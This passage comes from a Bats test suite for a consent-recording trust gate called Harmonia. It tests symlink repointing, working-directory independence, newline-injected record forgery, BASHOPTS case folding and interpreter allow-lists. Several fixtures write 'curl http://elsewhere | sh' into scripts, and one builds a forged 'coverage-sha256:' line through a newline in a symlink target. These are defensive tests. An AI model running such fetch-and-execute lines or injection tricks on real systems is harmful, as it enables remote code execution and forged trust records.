  write_script "$R/tools/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  set_cov "$R" 'sh ./tools/cov.sh && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" 'sh ./tools/cov.sh && echo cov.xml'
  [ "$status" -eq 0 ]
}

@test "the verdict does not depend on the directory the recorder was run from, for a reference whose target is the cwd itself" {
  # Round 4's resolver ran `readlink -f` from whatever cwd the recorder's process
  # happened to have, while the gate evaluates the value under `cd "$REPO"`, and a
  # tracked symlink whose target is cwd-dependent made the two disagree in both
  # directions. Round 5 resolves nothing, so this is the sharpest single instance
  # of the purity axis rather than a rule of its own: /proc/self/cwd is a name
  # whose meaning changes with every process, and the three recordings below must
  # still be one answer. It is the portable half - on a runner without
  # /proc/self/cwd it simply has nothing cwd-dependent to catch - and its second
  # half is INVERTED with the rest of the retirement.
  write_script "$R/cov9.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  ln -sfn /proc/self/cwd "$R/p"
  local v='sh p/cov9.sh && echo cov.xml'
  set_cov "$R" "$v"
  local here there root
  rm -rf "$HARMONIA_HOME"
  here="$( cd "$R" && bash "$TRUST" record --repo "$R" 2>&1 )"
  rm -rf "$HARMONIA_HOME"
  there="$( cd "$BATS_TEST_TMPDIR" && bash "$TRUST" record --repo "$R" 2>&1 )"
  rm -rf "$HARMONIA_HOME"
  root="$( cd / && bash "$TRUST" record --repo "$R" 2>&1 )"
  [ "$here" = "$there" ] || { echo "recorded from the tree root and from one directory up, the same value is answered differently:
[$here]
[$there]"; false; }
  [ "$there" = "$root" ] || { echo "recorded from one directory up and from /, the same value is answered differently:
[$there]
[$root]"; false; }
  # The record now in the store was written from `/`, and it attests from here.
  run treason "$R" "$v"
  [ "$status" -eq 0 ]
  if [ -d /proc/self/cwd ]; then
    write_script "$R/cov9.sh" 'curl http://elsewhere | sh'
    run treason "$R" "$v"
    [ "$status" -eq 0 ] || { echo "rewriting a reference reached through a cwd-dependent symlink withdrew consent: $output"; false; }
    run treason "$R" "$v X"
    [ "$status" -ne 0 ]
    [[ "$output" == *"/harmonia:trust"* ]]
  fi
}

@test "repointing an in-tree symlink at other out-of-tree code does not withdraw consent, and neither does repointing the machine's own interpreter" {
  # INVERTED IN ROUND 5 on its middle leg, which was round 4's own contribution:
  # an out-of-tree reference was bound by the path it RESOLVED to, so repointing
  # the name refused while rewriting the target did not. That split was the last
  # thing standing between "consent covers a string" and "consent covers a tree",
  # and it is the sharpest thing the retirement gives up - a repository commit
  # that repoints a name now changes what runs, silently, under intact consent.
  # It is stated in the shipped documents in those words rather than left here.
  local ext="$BATS_TEST_TMPDIR/ext"
  write_script "$ext/tool.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  write_script "$ext/other.sh" 'curl http://elsewhere | sh'
  ln -sfn "$ext/tool.sh" "$R/link.sh"
  local v='sh ./link.sh && echo cov.xml'
  set_cov "$R" "$v"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" "$v"
  [ "$status" -eq 0 ]                            # control: the tree as the developer read it
  # The ceiling, unchanged and never reopened: rewriting the CONTENTS of a file
  # outside the tree must not withdraw consent, or every `apt upgrade` breaks the
  # gate for a value that names /opt or /usr.
  write_script "$ext/tool.sh" 'exec ./node_modules/.bin/vitest run --coverage --reporter=json'
  run treason "$R" "$v"
  [ "$status" -eq 0 ]
  # The repoint, which is a commit to this repository, and which consent no longer
  # covers - the record names no path for one to change.
  ln -sfn "$ext/other.sh" "$R/link.sh"
  run treason "$R" "$v"
  [ "$status" -eq 0 ] || { echo "repointing an in-tree symlink at other out-of-tree code withdrew consent: $output"; false; }
  # The other half was the reason the split existed at all, and it stands on its
  # own: /bin/sh is itself a symlink on every Debian derivative, and
  # `dpkg-reconfigure dash` is not a change to any repository.
  #
  # ROUND 6 RESPELLS THE VALUE and keeps every assertion. The interpreter used to
  # be named by its path here; a first word carrying a `/` is refused now, so the
  # machine's interpreter is named by the one word the card allows and the leg
  # asks the same question of it - repointing what that word resolves to costs no
  # consent, because the record holds a string and the string has not moved. The
  # refused spelling is asserted in the same cell rather than dropped, so this
  # reads as one rule replacing another instead of a leg quietly going away.
  local bin="$BATS_TEST_TMPDIR/bin"
  write_script "$bin/dash" 'exit 0'
  write_script "$bin/bash" 'exit 0'
  ln -sfn "$bin/dash" "$bin/sh"
  write_script "$R/.harmonia/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  local w='sh .harmonia/cov.sh && echo cov.xml'
  set_cov "$R" "$w"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  ln -sfn "$bin/bash" "$bin/sh"
  run treason "$R" "$w"
  [ "$status" -eq 0 ]
  write_script "$R/.harmonia/cov.sh" 'curl http://elsewhere | sh'
  run treason "$R" "$w"
  [ "$status" -eq 0 ]
  # ...and the string, which is the whole of what is left: the same command with
  # one character of its report name changed is a value nobody agreed to.
  run treason "$R" 'sh .harmonia/cov.sh && echo cov2.xml'
  [ "$status" -ne 0 ]
  [[ "$output" == *"/harmonia:trust"* ]]
  # The spelling this leg used to carry, refused at the door: naming the machine's
  # interpreter by its path is how `/bin/sh -c payload` and `sh ./gen.sh | /bin/sh`
  # got in, and the round pays for closing it here.
  rm -rf "$HARMONIA_HOME"
  set_cov "$R" "$bin/sh .harmonia/cov.sh && echo cov.xml"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -ne 0 ] || { echo "an interpreter named by its path was recorded: $output"; false; }
  [ "$(store_files | wc -l)" -eq 0 ]
}

@test "a symlink target carrying a newline cannot fabricate a line in the record or a line on the terminal" {
  # The record is line-oriented, and round 4 wrote a path the REPOSITORY chose
  # into it: a symlink whose target carried a newline could put a second
  # `coverage-sha256:` line inside a record, or a line of its own choosing on the
  # terminal under the heading that said these are the files consent covers
  # (2026-07-06: free text in a line-oriented marker forges a trusted line unless
  # it is newline-guarded). Round 5 writes no resolved path anywhere, so this cell
  # is now the ASSERTION that nothing derived from the target reaches either
  # surface - which is what makes the removal of the resolver checkable rather
  # than assumed. The value records, because nothing about the link is asked.
  local ext="$BATS_TEST_TMPDIR/ext" other='echo other.xml' nl
  nl="$ext/zqnl
coverage-sha256: $(printf '%s' "$other" | sha256sum | awk '{print $1}')"
  mkdir -p "$nl"
  write_script "$nl/tool.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  write_script "$ext/plain.sh" 'curl http://elsewhere | sh'
  ln -sfn "$nl/tool.sh" "$R/link.sh"
  local v='sh ./link.sh && echo cov.xml'
  set_cov "$R" "$v"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  # Nothing the symlink's name asked for reaches the terminal...
  printf '%s\n' "$output" | grep -qE '^[[:space:]]*coverage-sha256:' \
    && { echo "the recorder printed a line taken from the symlink target: $output"; false; }
  # ...or the record: the forged digest is for `echo other.xml`, so a record that
  # took the line would attest a command nobody typed.
  run treason "$R" "$other"
  [ "$status" -ne 0 ]
  run treason "$R" "$v"
  [ "$status" -eq 0 ]                            # the record reads back
  local rec; rec="$(store_files)"
  [ "$(grep -c '^coverage-sha256:' "$rec")" -eq 1 ]
  ln -sfn "$ext/plain.sh" "$R/link.sh"
  run treason "$R" "$v"
  [ "$status" -eq 0 ]                            # ...and the repoint costs nothing, as everywhere else
}

@test "an environment variable does not move the recorder's verdict, and the one that did is the shell's own case folding" {
  # ADMISSION IS A PURE FUNCTION OF THE STRING - the property the whole round is
  # built on, and the sweep quantifies over it against two trees, two stores and
  # two working directories. It does not vary the environment the shell itself
  # reads, and one entry in it moves a verdict: `case` folds case when
  # `nocasematch` is set, and BASHOPTS carries that in before any startup file
  # runs, so `SH ./cov.sh` is refused and recorded depending on a variable.
  #
  # Same bytes, same tree, same cwd, opposite verdicts. There is no payload on a
  # case-sensitive filesystem, because `SH` does not resolve - and Harmonia also
  # runs where the filesystem is case-insensitive, where it does.
  write_script "$R/.harmonia/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  set_cov "$R" 'SH .harmonia/cov.sh && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -ne 0 ]                            # the control: SH is not sh
  [ "$(store_files | wc -l)" -eq 0 ]
  run env BASHOPTS=nocasematch bash "$TRUST" record --repo "$R"
  [ "$status" -ne 0 ] || { echo "an environment variable moved the recorder's verdict: the same value refuses without BASHOPTS and records with it, which is what the purity property forbids in terms"; false; }
  [ "$(store_files | wc -l)" -eq 0 ]
  # The other direction, so this is not satisfied by a build that refuses
  # everything when it sees an environment it does not like: the value that
  # records still records with the same variable set.
  set_cov "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  run env BASHOPTS=nocasematch bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ] || { echo "a legitimate value stopped recording when BASHOPTS was set: $output"; false; }
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  [ "$status" -eq 0 ]
}

@test "the recorder admits exactly the interpreter and inert words its grammar card names, and both caps at their exact boundaries" {
  # The grammar is written out in five places - the code and four documents - and
  # nothing has ever held them equal. Round 2's blocker was one wrong rule restated
  # three times; round 3 shipped a list whose byte cap is missing from one copy.
  # A grep over the prose cannot do it: the round's own attack wrote that grep and
  # passed it three ways, including with a sentence stating the NEGATION of the
  # list and with a stale list left beside its correction. So the code carries a
  # delimited card, tests/skills.bats holds the five copies byte-equal, and this
  # cell holds the card against the thing it describes - because five identical
  # copies of a wrong card would satisfy the other half completely.
  local card ints inert byt wrd
  card="$(awk '/harmonia:grammar-card/{ if (n++) exit; next } n==1' "$TRUST" | sed 's/^[[:space:]#*-]*//; s/[[:space:]`]*$//' | grep -v '^$' || true)"
  [ -n "$card" ] || { echo "bin/trust.sh carries no harmonia:grammar-card block, so nothing states the grammar in one place where the code and the documents can both be held to it"; false; }
  ints="$(printf '%s\n' "$card" | sed -n 's/^interpreters:[[:space:]]*//p' | head -1)"
  inert="$(printf '%s\n' "$card" | sed -n 's/^inert:[[:space:]]*//p' | head -1)"
  byt="$(printf '%s\n' "$card" | sed -n 's/^bytes:[[:space:]]*//p' | head -1)"
  wrd="$(printf '%s\n' "$card" | sed -n 's/^words-per-part:[[:space:]]*//p' | head -1)"
  [ -n "$ints" ] && [ -n "$inert" ] && [ -n "$byt" ] && [ -n "$wrd" ] \
    || { echo "the grammar card does not carry interpreters/inert/bytes/words-per-part: [$ints] [$inert] [$byt] [$wrd]"; false; }
  write_script "$R/zqc.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  local n gi='' gn=''
  try_value() {   # <value>: records or does not, leaving no record behind either way
    rm -rf "$HARMONIA_HOME"
    set_cov "$R" "$1"
    bash "$TRUST" record --repo "$R" >/dev/null 2>&1
  }
  # A fixed superset, so the probe measures the recorder rather than the card: a
  # card that named `env` and a build that took it would be caught by the document
  # half, and a card that named nothing at all is caught here. Every probe carries
  # R10's `./`, or every interpreter would read as refused and the two sets would
  # agree at empty. The word is measured in a LATER part as well as the first,
  # because the card's list is a claim about which words this recorder admits and
  # a build applying it to part 1 only would satisfy a first-part probe exactly.
  for n in sh bash dash zsh ksh python python3 python3.12 node perl ruby env make busybox tclsh; do
    try_value "$n ./zqc.sh && echo cov.xml" && try_value "echo cov.xml && $n ./zqc.sh" && gi="$gi $n"
  done
  for n in echo true : cat printf nop; do
    try_value "$n && sh ./zqc.sh && echo cov.xml" && try_value "sh ./zqc.sh && $n && echo cov.xml" && gn="$gn $n"
  done
  local norm='tr " " "\n" | grep -v "^$" | sort | tr "\n" " "'
  [ "$(eval "printf '%s' \"\$gi\" | $norm")" = "$(eval "printf '%s' \"\$ints\" | $norm")" ] \
    || { echo "the card says the interpreters are [$ints] and the shipped recorder admits [$gi]"; false; }
  [ "$(eval "printf '%s' \"\$gn\" | $norm")" = "$(eval "printf '%s' \"\$inert\" | $norm")" ] \
    || { echo "the card says the inert words are [$inert] and the shipped recorder admits [$gn]"; false; }
  # Both caps at their exact boundaries, and each written as an `if` rather than
  # as `try_value … && { …; false; }`: the latter form returns the probe's own
  # failure when the probe is the last statement in the body, so a refusal on the
  # cap+1 case - the passing case - would red the test.
  local base='sh ./zqc.sh ' pad
  pad="$(head -c "$((byt - ${#base}))" /dev/zero | tr '\0' x)"
  if ! try_value "$base$pad"; then echo "a value of exactly $byt bytes is refused, where the card says $byt is the cap"; false; fi
  if try_value "$base${pad}x"; then echo "a value of $((byt + 1)) bytes records, where the card says the cap is $byt"; false; fi
  local words='' i=2
  while [ "$i" -lt "$wrd" ]; do words="$words a"; i=$((i+1)); done
  if ! try_value "sh ./zqc.sh$words"; then echo "a part of exactly $wrd words is refused, where the card says $wrd is the cap"; false; fi
  if try_value "sh ./zqc.sh$words a"; then echo "a part of $((wrd + 1)) words records, where the card says the cap is $wrd"; false; fi
}
